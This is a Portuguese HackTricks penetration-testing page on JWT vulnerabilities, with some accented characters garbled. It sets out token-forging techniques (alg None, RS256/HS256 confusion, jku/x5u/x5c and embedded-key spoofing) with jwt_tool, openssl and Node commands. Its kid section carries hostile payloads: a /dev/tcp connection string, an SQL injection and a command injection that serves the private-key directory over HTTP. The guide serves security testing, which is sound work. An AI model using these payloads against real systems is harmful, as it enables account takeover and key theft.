# Vulnerabilidades JWT (Json Web Tokens)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Parte deste post foi retirada de:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor da excelente ferramenta para pentest de JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Vit√≥rias R√°pidas**

Execute [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) com o modo `All Tests!` e aguarde pelas linhas verdes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Se voc√™ tiver sorte, a ferramenta encontrar√° algum caso em que a aplica√ß√£o web est√° verificando incorretamente o JWT:

![](<../.gitbook/assets/image (435).png>)

Ent√£o, voc√™ pode procurar a requisi√ß√£o no seu proxy ou despejar o JWT usado para essa requisi√ß√£o usando jwt_tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Alterar dados sem modificar nada

Voc√™ pode simplesmente alterar os dados deixando a assinatura como est√° e verificar se o servidor est√° verificando a assinatura. Tente mudar seu nome de usu√°rio para "admin", por exemplo.

#### **O token est√° sendo verificado?**

* Se ocorrer uma mensagem de erro, a assinatura est√° sendo verificada - leia qualquer informa√ß√£o de erro detalhada que possa vazar algo sens√≠vel.
* Se a p√°gina retornada for diferente, a assinatura est√° sendo verificada.
* Se a p√°gina for a mesma, ent√£o a assinatura n√£o est√° sendo verificada - hora de come√ßar a alterar as reivindica√ß√µes do Payload para ver o que voc√™ pode fazer!

### Origem

Verifique de onde o token se originou no hist√≥rico de solicita√ß√µes do seu proxy. Ele deve ser criado no servidor, n√£o no cliente.

* Se foi visto pela primeira vez vindo do lado do cliente, ent√£o a **chave** √© acess√≠vel ao c√≥digo do lado do cliente - procure-a!
* Se foi visto pela primeira vez vindo do servidor, ent√£o est√° tudo bem.

### Dura√ß√£o

Verifique se o token dura mais de 24h... talvez ele nunca expire. Se houver um campo "exp", verifique se o servidor est√° lidando corretamente com ele.

### For√ßa bruta na chave secreta HMAC

[**Veja esta p√°gina.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modificar o algoritmo para None (CVE-2015-9235)

Defina o algoritmo usado como "None" e remova a parte da assinatura.

Use a extens√£o Burp chamada "JSON Web Token" para tentar essa vulnerabilidade e para alterar diferentes valores dentro do JWT (envie a solicita√ß√£o para o Repeater e na aba "JSON Web Token" voc√™ pode modificar os valores do token. Voc√™ tamb√©m pode selecionar para colocar o valor do campo "Alg" para "None").

### Mudar o algoritmo RS256 (assim√©trico) para HS256 (sim√©trico) (CVE-2016-5431/CVE-2016-10555)

O algoritmo HS256 usa a chave secreta para assinar e verificar cada mensagem.\
O algoritmo RS256 usa a chave privada para assinar a mensagem e usa a chave p√∫blica para autentica√ß√£o.

Se voc√™ mudar o algoritmo de RS256 para HS256, o c√≥digo do back end usa a chave p√∫blica como chave secreta e depois usa o algoritmo HS256 para verificar a assinatura.

Ent√£o, usando a chave p√∫blica e mudando RS256 para HS256, poder√≠amos criar uma assinatura v√°lida. Voc√™ pode recuperar o certificado do servidor web executando isto:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nova chave p√∫blica no cabe√ßalho

Um atacante incorpora uma nova chave no cabe√ßalho do token e o servidor usa essa nova chave para verificar a assinatura (CVE-2018-0114).

Isso pode ser feito com a extens√£o "JSON Web Tokens" do Burp.\
(Envie a solicita√ß√£o para o Repeater, na aba JSON Web Token selecione "CVE-2018-0114" e envie a solicita√ß√£o).

### JWKS Spoofing

Se o token usa uma reivindica√ß√£o de cabe√ßalho ‚Äújku‚Äù, ent√£o verifique a URL fornecida. Isso deve apontar para uma URL contendo o arquivo JWKS que possui a Chave P√∫blica para verificar o token. Altere o token para apontar o valor de jku para um servi√ßo web que voc√™ possa monitorar o tr√°fego.

Se voc√™ receber uma intera√ß√£o HTTP, agora sabe que o servidor est√° tentando carregar chaves da URL que voc√™ est√° fornecendo. _Use a flag -S do jwt\_tool junto com o argumento -u_ [_http://example.com_](http://example.com) _para gerar um novo par de chaves, injetar sua URL fornecida, gerar um JWKS contendo a Chave P√∫blica e assinar o token com a Chave Privada_

### Problemas com "kid"

`kid` √© uma reivindica√ß√£o de cabe√ßalho opcional que cont√©m um identificador de chave, particularmente √∫til quando voc√™ tem v√°rias chaves para assinar os tokens e precisa procurar a certa para verificar a assinatura.

#### Problemas com "kid" - revelar chave

Se a reivindica√ß√£o "kid" √© usada no cabe√ßalho, verifique o diret√≥rio web para esse arquivo ou uma varia√ß√£o dele. Por exemplo, se `"kid":"key/12345"`, ent√£o procure por _/key/12345_ e _/key/12345.pem_ na raiz web.

#### Problemas com "kid" - path traversal

Se a reivindica√ß√£o "kid" √© usada no cabe√ßalho, verifique se voc√™ pode usar um arquivo diferente no sistema de arquivos. Escolha um arquivo cujo conte√∫do voc√™ possa prever, ou talvez tente `"kid":"/dev/tcp/seuIP/seuPorto"` para testar conectividade, ou at√© mesmo alguns payloads de **SSRF**...\
_Use a flag -T do jwt\_tool para alterar o JWT e mudar o valor da reivindica√ß√£o kid, depois escolha manter a assinatura original_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Utilizando arquivos dentro do host com conte√∫do conhecido, voc√™ tamb√©m pode forjar um JWT v√°lido. Por exemplo, em sistemas Linux o arquivo `/proc/sys/kernel/randomize_va_space` tem o valor definido para **2**. Ent√£o, colocando esse **caminho** dentro do par√¢metro "**kid**" e usando "**2**" como a **senha sim√©trica** para gerar o JWT, voc√™ deve ser capaz de gerar um novo JWT v√°lido.

#### Problemas com "kid" - SQL Injection

Em um cen√°rio onde o conte√∫do do "kid" √© usado para recuperar a senha do banco de dados, voc√™ poderia alterar o payload dentro do par√¢metro "kid" para: `non-existent-index' UNION SELECT 'ATTACKER';-- -` e ent√£o assinar o JWT com a chave secreta `ATTACKER`.

#### Problemas com "kid" - OS Injection

Em um cen√°rio onde o par√¢metro "kid" cont√©m um caminho para o arquivo com a chave e esse caminho est√° sendo usado **dentro de um comando executado**, voc√™ poderia ser capaz de obter RCE e expor a chave privada com um payload como o seguinte: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### Ataques Diversos

As seguintes s√£o fraquezas conhecidas que devem ser testadas.

**Ataques de retransmiss√£o entre servi√ßos**

Algumas aplica√ß√µes web usam um servi√ßo JWT ‚Äòconfi√°vel‚Äô para gerar e gerenciar tokens para eles. No passado, ocorreram alguns casos em que um token gerado para um dos clientes do servi√ßo JWT poderia ser aceito por outro cliente do servi√ßo JWT.\
Se voc√™ observar o JWT sendo emitido ou renovado por um servi√ßo terceirizado, vale a pena identificar se voc√™ pode se inscrever para uma conta em outro cliente desse servi√ßo com o mesmo nome de usu√°rio/email. Se sim, tente pegar esse token e retransmiti-lo em uma solicita√ß√£o para o seu alvo. Ele √© aceito?

* Se o seu token for aceito, ent√£o voc√™ pode ter um problema cr√≠tico permitindo que voc√™ se passe por qualquer conta de usu√°rio. NO ENTANTO, esteja ciente de que, se voc√™ est√° se inscrevendo em um aplicativo de terceiros, pode ser necess√°rio buscar permiss√£o para testes mais amplos em caso de entrar em uma √°rea cinzenta legal!

**O exp √© verificado?**

A reivindica√ß√£o "exp" do Payload √© usada para verificar a expira√ß√£o de um token. Como os JWTs s√£o frequentemente usados na aus√™ncia de informa√ß√µes de sess√£o, eles precisam ser tratados com cuidado - em muitos casos, capturar e retransmitir o JWT de outra pessoa permitir√° que voc√™ se passe por esse usu√°rio.\
Uma mitiga√ß√£o contra ataques de retransmiss√£o de JWT (que √© aconselhada pelo RFC do JWT) √© usar a reivindica√ß√£o "exp" para definir um tempo de expira√ß√£o para o token. Tamb√©m √© importante definir as verifica√ß√µes relevantes no aplicativo para garantir que esse valor seja processado e o token rejeitado quando estiver expirado. Se o token cont√©m uma reivindica√ß√£o "exp" e o tempo de teste permitir - tente armazenar o token e retransmiti-lo ap√≥s o tempo de expira√ß√£o ter passado. _Use a flag -R do jwt\_tool para ler o conte√∫do do token, que inclui an√°lise de carimbo de data/hora e verifica√ß√£o de expira√ß√£o (carimbo de data/hora em UTC)_

* Se o token ainda validar no aplicativo, ent√£o isso pode ser um risco de seguran√ßa, pois o token pode NUNCA expirar.

### x5u e jku

#### jku

jku significa **URL do Conjunto JWK**.\
Se o token usa uma reivindica√ß√£o de **Cabe√ßalho** ‚Äú**jku**‚Äù, ent√£o **verifique a URL fornecida**. Isso deve apontar para uma URL contendo o arquivo JWKS que possui a Chave P√∫blica para verificar o token. Altere o token para apontar o valor jku para um servi√ßo web que voc√™ possa monitorar o tr√°fego.

Primeiro voc√™ precisa criar um novo certificado com novas chaves privadas e p√∫blicas
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Ent√£o voc√™ pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves p√∫blicas e privadas criadas e apontando o par√¢metro jku para o certificado criado.** Para criar um certificado jku v√°lido, voc√™ pode baixar o original e alterar os par√¢metros necess√°rios.

Voc√™ pode obter os par√¢metros "e" e "n" de um certificado p√∫blico usando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Um URI apontando para um conjunto de certificados p√∫blicos X.509 (um padr√£o de formato de certificado) codificados em forma PEM. O primeiro certificado no conjunto deve ser o utilizado para assinar este JWT. Os certificados subsequentes assinam cada um o anterior, completando assim a cadeia de certificados. X.509 √© definido no RFC 52807. Seguran√ßa de transporte √© necess√°ria para transferir os certificados.

Tente **alterar este cabe√ßalho para uma URL sob seu controle** e verifique se alguma solicita√ß√£o √© recebida. Nesse caso, voc√™ **poderia adulterar o JWT**.

Para forjar um novo token usando um certificado controlado por voc√™, voc√™ precisa criar o certificado e extrair as chaves p√∫blica e privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Ent√£o voc√™ pode usar, por exemplo, [**jwt.io**](https://jwt.io) para criar o novo JWT com as **chaves p√∫blica e privada criadas e apontando o par√¢metro x5u para o certificado .crt criado.**

![](<../.gitbook/assets/image (439).png>)

Voc√™ tamb√©m pode abusar dessas duas vulnerabilidades **para SSRFs**.

#### x5c

Este par√¢metro pode conter o **certificado em base64**:

![](<../.gitbook/assets/image (440).png>)

Se o atacante **gerar um certificado autoassinado** e criar um token forjado usando a chave privada correspondente e substituir o valor do par√¢metro "x5c" pelo certificado rec√©m-gerado e modificar os outros par√¢metros, nomeadamente n, e e x5t, ent√£o, essencialmente, o token forjado seria aceito pelo servidor.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Chave P√∫blica Embutida (CVE-2018-0114)

Se o JWT tiver uma chave p√∫blica embutida como no seguinte cen√°rio:

![](<../.gitbook/assets/image (438).png>)

Usando o seguinte script nodejs √© poss√≠vel gerar uma chave p√∫blica a partir desses dados:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
√â poss√≠vel gerar uma nova chave privada/p√∫blica, incorporar a nova chave p√∫blica dentro do token e us√°-la para gerar uma nova assinatura:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Voc√™ pode obter o "n" e o "e" usando este script nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finalmente, usando a chave p√∫blica e privada e os novos valores de "n" e "e", voc√™ pode usar [jwt.io](https://jwt.io) para forjar um novo JWT v√°lido com qualquer informa√ß√£o.

### JTI (Identificador JWT)

O JTI (Identificador JWT) fornece um identificador √∫nico para um Token JWT. Pode ser usado para prevenir a repeti√ß√£o do token.\
No entanto, imagine uma situa√ß√£o onde o comprimento m√°ximo do ID √© 4 (0001-9999). A requisi√ß√£o 0001 e 10001 v√£o usar o mesmo ID. Ent√£o, se o backend est√° incrementando o ID a cada requisi√ß√£o, voc√™ poderia abusar disso para **repetir uma requisi√ß√£o** (necessitando enviar 10000 requisi√ß√µes entre cada repeti√ß√£o bem-sucedida).

### JWT Registered claims

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Ferramentas

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de bug bounty criada por hackers, para hackers! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje, e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
